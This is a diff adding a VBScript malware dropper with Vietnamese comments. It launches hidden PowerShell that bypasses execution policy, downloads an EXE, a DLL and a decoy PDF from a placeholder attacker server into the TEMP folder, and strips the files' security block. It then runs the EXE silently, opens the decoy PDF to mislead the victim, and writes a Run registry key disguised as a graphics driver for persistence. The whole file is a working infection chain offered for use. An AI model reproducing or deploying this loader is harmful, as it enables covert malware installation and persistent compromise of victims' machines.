@@ -1,0 +1,40 @@
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
+
+' Cấu hình link VPS và tên file
+server = "http://IP_CUA_BAN/"
+exeFile = "app.exe"
+dllFile = "vinh.dll"
+pdfFile = "decoy.pdf"
+
+' Lệnh PowerShell tải file và Unblock (gỡ chặn bảo mật)
+' Thêm Unblock-File là cực kỳ quan trọng để EXE có thể load DLL
+downloadCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+" $w=New-Object Net.WebClient; " & _
+" $w.DownloadFile('" & server & exeFile & "', '" & strTemp & "\" & exeFile & "'); " & _
+" $w.DownloadFile('" & server & dllFile & "', '" & strTemp & "\" & dllFile & "'); " & _
+" $w.DownloadFile('" & server & pdfFile & "', '" & strTemp & "\" & pdfFile & "'); " & _
+" Unblock-File -Path '" & strTemp & "\" & exeFile & "'; " & _
+" Unblock-File -Path '" & strTemp & "\" & dllFile & "';"
+
+' 1. Thực hiện tải file ngầm và đợi tải xong
+WshShell.Run downloadCmd, 0, True 
+
+' 2. Kiểm tra và thực thi
+If fso.FileExists(strTemp & "\" & exeFile) Then
+    
+    ' SỬA TẠI ĐÂY: Chạy EXE với WorkingDirectory là TEMP để nó thấy DLL
+    ' Dùng PowerShell để Start-Process giúp quản lý thư mục làm việc chuẩn nhất
+    runExeCmd = "powershell.exe -WindowStyle Hidden -Command ""Start-Process -FilePath '" & strTemp & "\" & exeFile & "' -WorkingDirectory '" & strTemp & "'"""
+    WshShell.Run runExeCmd, 0, False
+    
+    ' Mở PDF mồi nhử
+    If fso.FileExists(strTemp & "\" & pdfFile) Then
+        WshShell.Run "cmd /c start """" """ & strTemp & "\" & pdfFile & """", 0, False
+    End If
+    
+    ' 3. Thiết lập Persistence (Tự khởi động)
+    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinGraphicsDriver"
+    WshShell.RegWrite regPath, strTemp & "\" & exeFile, "REG_SZ"
+End If
